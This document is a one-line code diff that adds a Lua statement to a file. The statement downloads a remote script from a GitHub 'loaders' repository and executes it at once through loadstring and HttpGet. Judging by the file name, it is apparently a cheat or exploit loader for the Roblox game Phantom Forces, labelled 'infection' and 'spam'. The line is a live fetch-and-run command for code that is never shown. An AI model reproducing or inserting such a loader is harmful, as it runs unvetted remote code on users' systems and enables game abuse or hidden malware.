@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/infection-phantom-forces-spam5-qinihf6ool2126.lua"))()
